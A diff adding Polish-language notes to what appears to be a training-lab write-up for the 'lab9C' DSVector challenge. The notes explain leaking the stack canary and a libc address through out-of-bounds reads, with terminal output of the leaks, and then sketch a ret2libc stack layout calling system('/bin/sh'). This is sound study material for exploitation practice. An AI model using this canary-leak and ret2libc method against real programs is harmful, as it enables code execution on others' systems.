@@ -274,4 +274,34 @@ class DSVector {
         T vector_data[1+256];
 };
 ```
-
+* Nie ma możliwości wskazania indeksu gdzie zostaną zapisane dane - aby dojść do końca "bufora" należy przeprowadzić sekwencyjny zapis na całej długości listy i dopiero wtedy możliwe jest nadpisanie kanarka oraz adresu powrotu + wpisanie adresu funkcji `system()` i `/bin/sh`
+* Kanarek znajduje się w odległości `257 * 4 + 8` od początku listy "wektorów":
+```
+lab9C@warzone:/levels/lab09$ ./lab9C 
++------- DSVector Test Menu -------+
+| 1. Append item                   |
+| 2. Read item                     |
+| 3. Quit                          |
++----------------------------------+
+Enter choice: 2 
+Choose an index: 257
+DSVector[257] = -181947136
+```
+* Ważna rzecz: program wyświetla liczby typu `unsigned int` za pomocą modyfikatora `printf(%d)`. Powoduje to problemy w wyświetlanej reprezentacji liczby - każda wyświetloną wartość adresu lub kanarka z programu wymaga operacji bitowej AND z `0xffffffff` (przykład z konwersją za pomocą IPython):
+```
+In [1]: hex(-181947136 & 0xffffffff)
+Out[1]: '0xf527b500'
+```
+* Aby wyliczyć adresy `system()` i `/bin/sh` wystarczy leak z zerowego indeksu tablicy "wektorów":
+```
+lab9C@warzone:/levels/lab09$ ./lab9C 
++------- DSVector Test Menu -------+
+| 1. Append item                   |
+| 2. Read item                     |
+| 3. Quit                          |
++----------------------------------+
+Enter choice: 2
+Choose an index: 0
+DSVector[0] = -1210785795
+```
+* Ostatnim krokiem jest zbudowanie odpowiedniego układu pamieci na stosie: `| ŚMIECI 256 indeksów | KANAREK | ŚMIECI (EBP) |  RA (system()) | system() - ARGS `
